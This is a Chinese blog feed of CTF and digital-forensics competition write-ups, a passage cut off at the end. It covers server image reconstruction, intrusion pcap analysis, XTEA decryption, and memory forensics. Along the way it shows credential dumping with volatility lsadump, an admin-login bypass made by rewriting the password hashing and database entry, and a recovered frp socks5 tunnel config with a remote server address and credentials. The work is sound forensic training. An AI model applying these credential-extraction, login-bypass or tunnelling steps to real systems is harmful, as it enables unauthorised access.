alt="image-20240426152509355"></p><h3 id="4-请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）"><a href="#4-请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）" class="headerlink" title="4.请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）"></a>4.<strong>请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）</strong></h3><pre><code>hl@7001</code></pre><p>网站数据库的root账号密码 其实首先应该看<code>config/database.php</code>文件 我们从服务器分析出来的zip格式的压缩包中可以找到一个<code>shopxo.zip</code>  解压之后看起来很像网站源码的格式 但是会发现<code>config</code>文件夹下并没有<code>database.php</code>这个文件 需要另找出路</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261532227.png" alt="image-20240426153220162"></p><p>我们发现服务器部分的附件除了给了<code>server4.E01</code> 之外还给了<code>server1 server2 server3</code>三个文件 看起来很像raid重组 直接使用火眼的raid重组工具 </p><p>先查看raid信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261535159.png" alt="image-20240426153554128"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261536595.png" alt="image-20240426153602558"></p><p>在使用raid重组成逻辑盘 条带大小根据前面的raid信息改为1024 再点击生成文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261537560.png" alt="image-20240426153737509"></p><p>得到重组之后的镜像 然后使用UFS Explorer导出真正的磁盘镜像 导出为1.dsk</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261545162.png" alt="image-20240426154527051"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261545820.png" alt="image-20240426154554774"></p><p>使用给出的<code>server4.E01</code>和导出的<code>1.dsk</code>两个磁盘进行仿真 将<code>server4.E01</code>作为系统盘  </p><p>仿真后 查看磁盘使用情况 看到这块磁盘已经存在了 </p><pre><code>lsblk</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261550164.png" alt="image-20240426155051131"></p><p>还需要在挂载上 这块磁盘其实就是&#x2F;data分区</p><pre><code>mount /dev/sdb /data</code></pre><p>成功挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261551716.png" alt="image-20240426155148676"></p><p>此时的<code>/data/2023.cn/config/</code>文件夹下就有<code>database.php</code>了 成功查看到用户名和密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261552698.png" alt="image-20240426155257652"></p><h3 id="5-请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx-xx-xxx-xxx-）"><a href="#5-请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx-xx-xxx-xxx-）" class="headerlink" title="5. 请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx($xx.xxx($xxx)）"></a><strong>5. 请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx($xx.xxx($xxx)）</strong></h3><pre><code>md5($salt.trim($pwd))</code></pre><p>直接在源码里面搜<code>$pwd</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242327139.png" alt="image-20240424232724073"></p><h3 id="6-请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）"><a href="#6-请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）" class="headerlink" title="6. 请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）"></a>6. 请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</h3><pre><code>2020-07-09 13:46:17</code></pre><h4 id="解决xshell和xftp连接问题"><a href="#解决xshell和xftp连接问题" class="headerlink" title="解决xshell和xftp连接问题"></a>解决xshell和xftp连接问题</h4><p>在仿真镜像后 我们会发现无法正常连接xshell和xftp  这篇文章可以解决</p><p><a href="https://blog.csdn.net/Jupite_ch/article/details/107034135">centos服务器拒绝ssh连接问题</a></p><p>查看<code>hosts.allow和hosts.deny</code>两个文件 将里面最后一行的内容直接注释就可以正常连接xshell和xftp</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261628619.png" alt="image-20240426162853579"></p><p>解决这个问题之后 我们直接连上xftp 将网站源码保存到本地 然后使用FileLocator搜索<code>弘连</code>关键字 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261643669.png" alt="image-20240426164333588"></p><h3 id="7-请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx-php）"><a href="#7-请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx-php）" class="headerlink" title="7. 请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx.php）"></a><strong>7.</strong> <strong>请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：<strong><strong>xxx.php</strong></strong>）</strong></h3><pre><code>4008003721.php</code></pre><p>查看网站操作日志 看到将<code>admin.php</code>文件重命名为了<code>4008003721.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261650783.png" alt="image-20240426165026735"></p><p>为了验证一下这个结果 我们需要重构网站一下 </p><p>我们在火眼的分析结果中看到存在docker容器 并且是mysql的容器 同时使用<code>netstat -lnpt</code>命令查看端口使用情况看到本地mysql端口是3306 但是<code>database.php</code>中写的mysql服务端口是3307 说明这个网站的数据库在docker容器中 而不是服务器本机中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261659342.png" alt="image-20240426165908311"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261659636.png" alt="image-20240426165937577"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261527826.png" alt="image-20240426152750756"></p><p>我们在挂载上raid重组盘之后 就解决了宝塔面板中没有网站源码的问题 下一步直接启动docker容器中的mysql服务即可</p><pre><code>docker ps -a docker start 8fbd1968d75e</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261701189.png" alt="image-20240426170118160"></p><p>然后修改我们本地hosts文件 使用火绒就行 在其中添加</p><pre><code>192.168.24.133 www.hl2023.cn</code></pre><p>赋予网站源码全部权限 </p><pre><code>chmod 777 -R 2023.cn</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261703443.png" alt="image-20240426170337405"></p><p>就可以访问网站了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261704955.png" alt="image-20240426170411630"></p><p>在访问前面找到的后台管理页面 成功访问 说明这个页面就是后台管理页面 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261704169.png" alt="image-20240426170459010"></p><h4 id="后台密码绕过"><a href="#后台密码绕过" class="headerlink" title="后台密码绕过"></a>后台密码绕过</h4><p>顺便说一下 怎么绕过后台登陆密码 前面我们也知道了后台登陆密码的加密方式是带盐值的md5加密 我们直接修改网站源码 将加密方式改为直接md5加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261713965.png" alt="image-20240426171324931"></p><p>使用cmd5网站 得到<code>123456</code>的md5加密值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261714682.png" alt="image-20240426171428611"></p><p>在docker中进入mysql服务 修改admin的密码为123456的md5加密值 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261714491.png" alt="image-20240426171456404"></p><p>访问后台管理页面 使用<code>admin/123456</code>成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261717422.png" alt="image-20240426171726286"></p><h3 id="8-请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写"><a href="#8-请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写" class="headerlink" title="8.请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写"></a>8.请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写</h3><pre><code>9dede75e455a7c4c5cc4b61e41570adf82af25251c5fd8456a637add864b0af0</code></pre><p>在宝塔中看到数据库存在备份文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261651058.png" alt="image-20240426165144979"></p><p>从火眼分析中找这个文件 导出计算sha256</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261652274.png" alt="image-20240426165225224"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261652251.png" alt="image-20240426165250217"></p><h3 id="9-请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）"><a href="#9-请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）" class="headerlink" title="9.请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）"></a>9.<strong>请对所给服务器检材进行分析，网站数据库备份文件的解压密码是多少？（答案格式：xxxxxxx区分大小写）</strong></h3><pre><code>22Ga#ce3ZBHV&amp;Fr59fE#</code></pre><p>服务器文件系统中root文件夹下有个<code>.w0rd.txt</code>文档 是解压密码字典 提出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242344645.png" alt="image-20240424234407538"></p><p>放passwarekit里面字典爆破</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242347329.png" alt="image-20240424234702221"></p><h3 id="10-请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999-99）"><a href="#10-请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999-99）" class="headerlink" title="10. 请对所给服务器检材进行分析，商城中“弘连火眼手机分析专用机MT510”商品的原价是多少？（只填写数字，精确到小数点后2位：9999.99）"></a><strong>10. 请对所给服务器检材进行分析，商城中“</strong>弘连火眼手机分析专用机MT510<strong>”商品的原价是多少？（只填写数字，精确到小数点后2位：9999.99）</strong></h3><pre><code>1398000.00</code></pre><p>直接在网站中搜不到 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261707324.png" alt="image-20240426170707259"></p><p>用我们上面解压出的数据库备份文件 直接在宝塔中导入恢复</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261707783.png" alt="image-20240426170734703"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261711325.png" alt="image-20240426171110222"></p><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="1-请分析流量分析-pcapng文件，并回答入侵者的IP地址是？"><a href="#1-请分析流量分析-pcapng文件，并回答入侵者的IP地址是？" class="headerlink" title="1.请分析流量分析.pcapng文件，并回答入侵者的IP地址是？"></a>1.请分析流量分析.pcapng文件，并回答入侵者的IP地址是？</h3><pre><code>192.168.85.130</code></pre><p>最后拿到权限之后从这个ip上下载了文件 那么这个ip就是攻击者ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261722393.png" alt="image-20240426172226311"></p><h3 id="2-请分析流量分析-pcapng文件，并回答被入侵计算机中的cms软件版本是？-答案格式：1-1-1"><a href="#2-请分析流量分析-pcapng文件，并回答被入侵计算机中的cms软件版本是？-答案格式：1-1-1" class="headerlink" title="2.请分析流量分析.pcapng文件，并回答被入侵计算机中的cms软件版本是？(答案格式：1.1.1)"></a>2.请分析流量分析.pcapng文件，并回答被入侵计算机中的cms软件版本是？(答案格式：1.1.1)</h3><pre><code>5.2.1</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261722888.png" alt="image-20240426172253849"></p><h3 id="3-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQL版本号是？-答案格式：1-1-1"><a href="#3-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQL版本号是？-答案格式：1-1-1" class="headerlink" title="3.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL版本号是？(答案格式：1.1.1)"></a>3.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQL版本号是？(答案格式：1.1.1)</h3><pre><code>5.5.53</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261723748.png" alt="image-20240426172311686"></p><h3 id="4-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？"><a href="#4-请分析流量分析-pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？" class="headerlink" title="4.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？"></a>4.请分析流量分析.pcapng文件，并回答被入侵计算机中的MySQLroot账号密码是？</h3><pre><code>admin@12345</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261723712.png" alt="image-20240426172333674"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261725676.png" alt="image-20240426172525606"></p><h3 id="5-请分析流量分析-pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？"><a href="#5-请分析流量分析-pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？" class="headerlink" title="5.请分析流量分析.pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？"></a>5.<strong>请分析流量分析.pcapng文件，并回答入侵者利用数据库管理工具创建了一个文件，该文件名为？</strong></h3><pre><code>06b8dcf11e2f7adf7ea2999d235b8d84.php</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271946438.png" alt="image-20240424212945089"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271946041.png" alt="image-20240424212952731"></p><h3 id="6-请分析流量分析-pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？"><a href="#6-请分析流量分析-pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？" class="headerlink" title="6.请分析流量分析.pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？"></a>6.请分析流量分析.pcapng文件，并回答被入侵计算机中PHP环境禁用了几个函数？</h3><pre><code>10个</code></pre><p>直接搜<code>disable_function</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947799.png" alt="image-20240424210620482"></p><p>一共10个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947044.png" alt="image-20240424210642713"></p><h3 id="7-请分析流量分析-pcapng文件，并回答入侵者提权后，执行的第1条命令是？"><a href="#7-请分析流量分析-pcapng文件，并回答入侵者提权后，执行的第1条命令是？" class="headerlink" title="7.请分析流量分析.pcapng文件，并回答入侵者提权后，执行的第1条命令是？"></a>7.<strong>请分析流量分析.pcapng文件，并回答入侵者提权后，执行的第1条命令是？</strong></h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947241.png" alt="image-20240424210144330"></p><pre><code>dir</code></pre><h3 id="8-请分析流量分析-pcapng文件，并回答被入侵计算机开机时间是？"><a href="#8-请分析流量分析-pcapng文件，并回答被入侵计算机开机时间是？" class="headerlink" title="8.请分析流量分析.pcapng文件，并回答被入侵计算机开机时间是？"></a>8.请分析流量分析.pcapng文件，并回答被入侵计算机开机时间是？</h3><pre><code>2019/6/13, 18:50:33</code></pre><p>被入侵后 在里面执行了systeminfo命令 可以看到上一次计算机的启动时间</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404271947511.png" alt="image-20240424211721791"></p><h3 id="9-请分析流量分析-pcapng文件，并回答被入侵计算机桌面上的文件中flag是？-答案格式：abcdef123456789"><a href="#9-请分析流量分析-pcapng文件，并回答被入侵计算机桌面上的文件中flag是？-答案格式：abcdef123456789" class="headerlink" title="9.请分析流量分析.pcapng文件，并回答被入侵计算机桌面上的文件中flag是？(答案格式：abcdef123456789)"></a>9.<strong>请分析流量分析.pcapng文件，并回答被入侵计算机桌面上的文件中flag是？(答案格式：abcdef123456789)</strong></h3><p>直接追踪tcp流 到第1364流</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261725954.png" alt="image-20240426172559868"></p><h3 id="10-请分析流量分析-pcapng文件，并回答图片文件中的flag是？-答案格式：abcdef123456789"><a href="#10-请分析流量分析-pcapng文件，并回答图片文件中的flag是？-答案格式：abcdef123456789" class="headerlink" title="10.请分析流量分析.pcapng文件，并回答图片文件中的flag是？ (答案格式：abcdef123456789)"></a>10.<strong>请分析流量分析.pcapng文件，并回答图片文件中的flag是？ (答案格式：abcdef123456789)</strong></h3><p>http导出可以得到一个flag.png 末尾有压缩包</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726500.png" alt="image-20240426172615443"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726181.png" alt="image-20240426172624131"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261726439.png" alt="image-20240426172634398"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;第七届精武杯-西柚的喵帕斯WP&quot;&gt;&lt;a href=&quot;#第七届精武杯-西柚的喵帕斯WP&quot; class=&quot;headerlink&quot; title=&quot;第七届精武杯-西柚的喵帕斯WP&quot;&gt;&lt;/a&gt;第七届精武杯-西柚的喵帕斯WP&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;计算机&amp;amp;&amp;a</summary>
      
    
    
    
    <category term="取证" scheme="http://w3nx1z1.github.io/categories/%E5%8F%96%E8%AF%81/"/>
    
    
  </entry>
  
  <entry>
    <title>2024数信杯北部赛区wp</title>
    <link href="http://w3nx1z1.github.io/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/"/>
    <id>http://w3nx1z1.github.io/2024/05/02/2024%E6%95%B0%E4%BF%A1%E6%9D%AF/</id>
    <published>2024-05-02T13:54:43.678Z</published>
    <updated>2024-05-02T13:56:35.738Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2024数信杯"><a href="#2024数信杯" class="headerlink" title="2024数信杯"></a>2024数信杯</h1><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302319982.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302319912.png" alt="img"></p><p>战队名：西柚喵帕斯 </p><p>排名：16</p><h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="Drinktea"><a href="#Drinktea" class="headerlink" title="Drinktea"></a>Drinktea</h3><p>python字节码，分析转换成python源码</p><pre><code class="Python">from ctypes import c_uint32  import structdef encrypt(v, key):    v0 = c_uint32(v[0]).value    v1 = c_uint32(v[1]).value    delta = 555885348    total = c_uint32(0).value    for i in range(32):        v0 += ((v1 &lt;&lt; 4 ^ v1 &gt;&gt; 5) + v1) ^ (total + key[total &amp; 3] ^ v1)        total += delta        v1 += ((v0 &lt;&lt; 4 ^ v0 &gt;&gt; 5) + v0) ^ (total + key[total &gt;&gt; 11 &amp; 3] ^ v0)    return [v0, v1]key = [1900550021, 2483099539, 2205172504, 1359557939]arr = [    [392252415, 2941946969],    [1122976151, 1335193774],    [815478816, 2529100980],    [2237049875, 188954780]]flag = input(&#39;please input flag: &#39;)encry = []encryted = []for i in range(len(flag) // 8):    encry.append(struct.unpack(&#39;&lt;I&#39;, flag[i*8:(i+1)*8].encode(&#39;utf-8&#39;))[0])    encry.append(struct.unpack(&#39;&lt;I&#39;, flag[i*8+4:(i+1)*8].encode(&#39;utf-8&#39;))[0])    encrypted = encrypt(encry, key)    encryted.append(encrypted)if encryted == arr:    print(&#39;yes~&#39;)else:    print(&#39;no~&#39;)</code></pre><p>简单的xtea加密，把每一段结果拼起来包flag就可以</p><pre><code class="Python">from ctypes import * import structdef encrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    sum1=c_uint32(0)    delta=0x9e3779b9    for i in range(32):        v0.value+=(((v1.value&lt;&lt;4)^(v1.value&gt;&gt;5))+v1.value)^(sum1.value+k[sum1.value&amp;3])        sum1.value+=delta        v1.value+=(((v0.value&lt;&lt;4)^(v0.value&gt;&gt;5))+v0.value)^(sum1.value+k[(sum1.value&gt;&gt;11)&amp;3])    return v0.value,v1.value def decrypt(v,k):    v0=c_uint32(v[0])    v1=c_uint32(v[1])    delta=555885348    sum1=c_uint32(delta*32)    for i in range(32):        v1.value-=(((v0.value&lt;&lt;4)^(v0.value&gt;&gt;5))+v0.value)^(sum1.value+k[(sum1.value&gt;&gt;11)&amp;3])        sum1.value-=delta        v0.value-=(((v1.value&lt;&lt;4)^(v1.value&gt;&gt;5))+v1.value)^(sum1.value+k[sum1.value&amp;3])    return v0.value,v1.value a1=[392252415, 2941946969]a2=[1122976151, 1335193774]a3=[815478816, 2529100980]a4=[2237049875, 188954780]k = [1900550021, 2483099539, 2205172504, 1359557939]res1=decrypt(a1,k)res2=decrypt(a2,k)res3=decrypt(a3,k)res4=decrypt(a4,k)  print(struct.pack(&#39;&lt;I&#39;,res1[0]))print(struct.pack(&#39;&lt;I&#39;,res1[1]))print(struct.pack(&#39;&lt;I&#39;,res2[0]))print(struct.pack(&#39;&lt;I&#39;,res2[1]))print(struct.pack(&#39;&lt;I&#39;,res3[0]))print(struct.pack(&#39;&lt;I&#39;,res3[1]))print(struct.pack(&#39;&lt;I&#39;,res4[0]))print(struct.pack(&#39;&lt;I&#39;,res4[1]))# acb8739759dc496ccc945703037e037f</code></pre><h3 id="Rrrccc"><a href="#Rrrccc" class="headerlink" title="Rrrccc"></a>Rrrccc</h3><p>upx壳，直接脱脱不掉，winhex打开发现把”UPX”改成了”upx”，改回来就能直接<code>upx -d</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320589.png" alt="img"></p><p>ida打开看一下是SMC代码自修改，动调</p><p>反调试，patch一下修改跳转条件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320131.png" alt="img"></p><p>cipher很明显直接写出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320684.png" alt="img"></p><p>过了一遍流程推测flag和cipher长度应该是相等，直接拿cipher作输入</p><p>动调跑完拿到输入的第一层加密结果，和输入异或就能得到key1</p><p>第二层异或的key2直接动调出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302320631.png" alt="img"></p><p>exp：</p><pre><code class="Python">cipher = &quot;Whatareyourencryption&amp;decryptionbasics&quot;flag = []#先用key2解第二层key2 = [0x1C, 0x0CB, 0x0F5, 0x53, 0x91, 0x0CC, 0x3B, 0x66, 0x4, 0x7D, 0x0BA, 0x0D2, 0x56, 0x0CE, 0x14, 0x0A4, 0x0E8, 0x7F, 0x0C2, 0x0C4, 0x2B, 0x86, 0x32, 0x0F0, 0x0F7, 0x0EA, 0x0FB, 0x0F0, 0x78, 0x34, 0x9A, 0x3, 0x13, 0x0A2, 0x91, 0x37, 0x48, 0x66]for i in range(38):    flag.append(ord(cipher[i]) ^ key2[i])#求key1cipher1 = [0x7A, 0xA7, 0x94, 0x34, 0xEA, 0xA8, 0x08, 0x02, 0x66, 0x4B,   0x83, 0xB3, 0x65, 0xFA, 0x75, 0x91, 0xD9, 0x1B, 0xF5, 0xA1,   0x1A, 0xE2, 0x00, 0xC3, 0x93, 0xDC, 0xC9, 0xC1, 0x4D, 0x0D,   0xAA, 0x3B, 0x21, 0x95, 0xF2, 0x07, 0x79, 0x1B,]input = &quot;Whatareyourencryption&amp;decryptionbasics&quot;key1 = []for i in range(len(cipher1)):    key1.append(cipher1[i] ^ ord(input[i]))#最后把第二层解密结果用key1解for i in range(len(flag)):    flag[i] ^= key1[i]    print(chr(flag[i]),end=&#39;&#39;)    #flag&#123;d3db69a34a51d7e1d23d621590827c01&#125;</code></pre><h3 id="Magic-Audio"><a href="#Magic-Audio" class="headerlink" title="Magic Audio"></a>Magic Audio</h3><p>拿到一个wav文件 先看文件尾 有个压缩包 提取出来</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321988.png" alt="img"></p><p>发现有密码 听一下这个音频 慢扫描电视 用sstv直接转</p><pre><code class="Bash">sstv -d ctf.wav -o out.png </code></pre><p>得到out.png</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321306.png" alt="img"></p><p>使用这个菜就多练作为密码进行解压 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302321966.png" alt="img"></p><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><h3 id="不安全的U盘1"><a href="#不安全的U盘1" class="headerlink" title="不安全的U盘1"></a>不安全的U盘1</h3><pre><code>请提交小明电脑中的test账户的密码(格式为hash对应的明文,长度为9)</code></pre><p>直接lsadump获得强密码</p><pre><code class="Bash">.\volatility.exe -f E:\Desktop\数信杯\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 lsadump</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302329864.png" alt="img"></p><p>hahaha123</p><h3 id="不安全的U盘2-赛后复盘"><a href="#不安全的U盘2-赛后复盘" class="headerlink" title="不安全的U盘2(赛后复盘)"></a>不安全的U盘2(赛后复盘)</h3><p>答案要求是去掉空格后是56位字符</p><p>最令我无语的一道题 当时已经把那个程序路径找到了 但是因为sb txt文档给我显示一共是57列 自己数的时候不知道为什么死活数不出来56位 最后错失一题的分数 </p><p>展示一下当时的做题截图 我真的是把可能的所有情况都列出来了  但其实第一个就是正确答案 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315946.png" alt="image-20240430113716050"></p><p>下面简单说一下做法 首先根据题干 我们得知是因为一个pdf文件导致系统被入侵 我们直接在r-studio中进行寻找并导出</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315272.png" alt="image-20240430115702665"></p><p>将这个<code>README.pdf</code>放入沙箱进行分析 看到执行流程中存在<code>AcroRd32.exe</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315180.png" alt="image-20240430115747055"></p><p>在vol中搜索一下这个程序</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302315901.png" alt="image-20240430115949722"></p><p>直接在红框前面加上盘符再去掉空格就是正确答案</p><pre><code>C:\Program Files (x86)\Adobe\Reader 9.0\Reader\AcroRd32.exeC:\ProgramFiles(x86)\Adobe\Reader9.0\Reader\AcroRd32.exe</code></pre><h3 id="不安全的U盘3"><a href="#不安全的U盘3" class="headerlink" title="不安全的U盘3"></a>不安全的U盘3</h3><p>请提交控制小明的服务器地址:端口(格式为”ip:port”,长度为19)</p><p>netscan查看网络连接情况</p><pre><code class="Bash">.\volatility.exe -f E:\Desktop\数信杯\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 netscan</code></pre><p>找外网ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302332523.png" alt="img"></p><h3 id="不安全的U盘4-赛后复盘"><a href="#不安全的U盘4-赛后复盘" class="headerlink" title="不安全的U盘4(赛后复盘)"></a>不安全的U盘4(赛后复盘)</h3><pre><code>找到外联地址 </code></pre><p>直接使用vol查看<code>.exe</code>文件</p><pre><code>.\volatility.exe -f E:\Desktop\比赛\2024数信杯\数据分析\file1\不安全的U盘_3ba0c570fac7eef3e90acc3eaabb5c8d\1.raw --profile=Win7SP1x64 filescan | findstr &quot;.exe&quot;</code></pre><p>看到两个比较可疑的文件 都提取出来看看 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317975.png" alt="image-20240430153506056"></p><p>放入沙箱分析</p><p>hh.exe的通信并不是外部地址 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317185.png" alt="image-20240430154052457"></p><p>但是f.exe同文件夹下有个toml软件程序配置文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404302317550.png" alt="image-20240430155011474"></p><p>提取出来 看一下内容</p><pre><code>[common]serverAddr = &quot;118.180.126.13&quot;serverPort = 6770[plugin_socks]type = &quot;tcp&quot;remote_port = 32124plugin = &quot;socks5&quot;plugin_user = &quot;admin&quot;plugin_passwd = &quot;admin123@qwe&quot;use_encryption = trueuse_compression = true</code></pre><p>所以外联地址是</p><pre><code>118.180.126.13</code></pre><p>也可以直接在镜像文件中搜索<code>remote_port</code>这种配置文件中常出现的信息</p><h3 id="网站数据绝对安全1"><a href="#网站数据绝对安全1" class="headerlink" 